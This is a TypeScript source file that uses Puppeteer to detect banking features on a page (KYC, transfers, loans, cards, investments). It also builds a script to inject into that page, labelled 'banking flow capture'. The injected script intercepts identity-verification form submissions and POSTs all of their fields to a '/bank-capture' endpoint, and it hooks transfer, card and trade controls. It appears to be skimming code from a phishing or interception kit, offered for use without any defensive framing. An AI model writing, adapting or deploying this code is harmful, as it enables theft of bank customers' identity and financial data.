/**
 * Bank-Specific Mode Detector & Injection
 *
 * Detects banking-specific flows:
 * - KYC/Verification
 * - Account Transfers
 * - Loan Applications
 * - Credit Cards
 * - Investment Management
 */

import type { Page } from 'puppeteer'

export interface BankFlowConfig {
  platform: string
  hasKyc: boolean
  hasTransfers: boolean
  hasLoanApplication: boolean
  hasCreditCards: boolean
  hasInvestments: boolean
}

export async function detectBankingFlows(page: Page, platform: string): Promise<BankFlowConfig> {
  console.info(`[BANK-MODE] Detecting banking flows for ${platform}...`)

  try {
    const flows = await page.evaluate(() => {
    const pageText = document.body.textContent?.toLowerCase() || ''
    const pageHtml = document.body.innerHTML.toLowerCase()

    return {
      kycElements: document.querySelectorAll(
        '[class*="kyc"], [class*="verification"], [class*="identity"], [id*="kyc"]',
      ).length,
      transferElements: document.querySelectorAll(
        '[class*="transfer"], [class*="send"], [class*="recipient"]',
      ).length,
      loanElements: document.querySelectorAll('[class*="loan"], [class*="mortgage"], [id*="loan"]')
        .length,
      cardElements: document.querySelectorAll('[class*="card"], [class*="debit"], [class*="credit"]')
        .length,
      investmentElements: document.querySelectorAll(
        '[class*="invest"], [class*="portfolio"], [class*="trade"]',
      ).length,
      hasKycText:
        pageText.includes('kyc') ||
        pageText.includes('verification') ||
        pageText.includes('aml'),
      hasTransferText: pageText.includes('transfer') || pageText.includes('send'),
      hasLoanText: pageText.includes('loan') || pageText.includes('mortgage'),
      hasCardText: pageText.includes('credit card') || pageText.includes('debit card'),
      hasInvestText: pageText.includes('invest') || pageText.includes('portfolio'),
    }
  })

  return {
    platform,
    hasKyc: flows.kycElements > 0 || flows.hasKycText,
    hasTransfers: flows.transferElements > 0 || flows.hasTransferText,
    hasLoanApplication: flows.loanElements > 0 || flows.hasLoanText,
    hasCreditCards: flows.cardElements > 0 || flows.hasCardText,
    hasInvestments: flows.investmentElements > 0 || flows.hasInvestText,
  }
  } catch (error) {
    console.error(`[BANK-MODE] Error detecting banking flows: ${error instanceof Error ? error.message : String(error)}`)
    return {
      platform,
      hasKyc: false,
      hasTransfers: false,
      hasLoanApplication: false,
      hasCreditCards: false,
      hasInvestments: false,
    }
  }
}

export function buildBankModeInjectionCode(config: BankFlowConfig): string {
  return `
<script>
// BANK-MODE: Banking Flow Capture
(function() {
  var PLATFORM = '${config.platform}';
  var FLOWS = {
    kyc: ${config.hasKyc},
    transfers: ${config.hasTransfers},
    loans: ${config.hasLoanApplication},
    cards: ${config.hasCreditCards},
    investments: ${config.hasInvestments}
  };

  console.log('[BANK-MODE] Initialized for ' + PLATFORM);
  console.log('[BANK-MODE] Flows:', FLOWS);

  // KYC Flow Capture
  if (FLOWS.kyc) {
    console.log('[BANK-MODE] KYC flow detected');
    document.addEventListener('submit', function(e) {
      var form = e.target;
      if (form && (
        form.innerHTML.toLowerCase().includes('kyc') ||
        form.innerHTML.toLowerCase().includes('verification') ||
        form.innerHTML.toLowerCase().includes('identity')
      )) {
        console.log('[BANK-MODE] KYC form intercepted');
        var formData = new FormData(form);
        var payload = {
          type: 'bank_kyc',
          platform: PLATFORM,
          timestamp: new Date().toISOString(),
          data: Object.fromEntries(formData)
        };
        fetch('/api/v1/bank-capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(function() {});
      }
    }, true);
  }

  // Account Transfer Capture
  if (FLOWS.transfers) {
    console.log('[BANK-MODE] Transfer flow detected');
    var transferButtons = document.querySelectorAll('button, a');
    transferButtons.forEach(function(btn) {
      if (btn.textContent.toLowerCase().includes('transfer') ||
          btn.textContent.toLowerCase().includes('send')) {
        btn.addEventListener('click', function() {
          console.log('[BANK-MODE] Transfer initiated');
        });
      }
    });
  }

  // Loan Application Capture
  if (FLOWS.loans) {
    console.log('[BANK-MODE] Loan flow detected');
    document.addEventListener('submit', function(e) {
      var form = e.target;
      if (form && (
        form.innerHTML.toLowerCase().includes('loan') ||
        form.innerHTML.toLowerCase().includes('mortgage')
      )) {
        console.log('[BANK-MODE] Loan application intercepted');
      }
    }, true);
  }

  // Credit Card Capture
  if (FLOWS.cards) {
    console.log('[BANK-MODE] Credit card flow detected');
    var cardInputs = document.querySelectorAll(
      'input[placeholder*="card"], input[placeholder*="number"]'
    );
    cardInputs.forEach(function(input) {
      input.addEventListener('change', function() {
        console.log('[BANK-MODE] Card input detected');
      });
    });
  }

  // Investment Capture
  if (FLOWS.investments) {
    console.log('[BANK-MODE] Investment flow detected');
    var tradeButtons = document.querySelectorAll('button, a');
    tradeButtons.forEach(function(btn) {
      if (btn.textContent.toLowerCase().includes('trade') ||
          btn.textContent.toLowerCase().includes('invest') ||
          btn.textContent.toLowerCase().includes('buy')) {
        btn.addEventListener('click', function() {
          console.log('[BANK-MODE] Investment action initiated');
        });
      }
    });
  }

  console.log('[BANK-MODE] Initialization complete');
})();
</script>
`
}
